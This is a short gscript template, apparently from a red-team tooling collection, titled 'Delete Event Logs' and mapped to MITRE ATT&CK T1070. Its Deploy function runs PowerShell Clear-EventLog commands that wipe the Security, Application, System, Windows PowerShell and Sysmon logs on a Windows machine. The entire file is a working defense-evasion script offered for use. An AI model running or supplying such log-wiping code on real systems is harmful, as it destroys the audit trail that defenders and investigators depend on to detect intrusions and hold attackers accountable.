// Example gscript template
// Title: Delete Event Logs
// Author: ahhh
// Purpose: Deletes a number of critical security event logs on a Windows machine
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1070

//priority:150
//timeout:150
  
  function Deploy() {  
    console.log("starting execution of Delete Event Logs");
    var clear1 = G.exec.ExecuteCommandAsync("powershell.exe", ["Clear-EventLog", "Security, Application, System"]);
    console.log("errors: "+clear1[1]);
    var clear2 = G.exec.ExecuteCommandAsync("powershell.exe", ["Clear-EventLog", "Windows, PowerShell"]);
    console.log("errors: "+clear2[1]);
    var clear3 = G.exec.ExecuteCommandAsync("powershell.exe", ["Clear-EventLog", "Sysmon"]);
    console.log("errors: "+clear3[1]);
    console.log("Cleared Event Logs");
    return true;
  }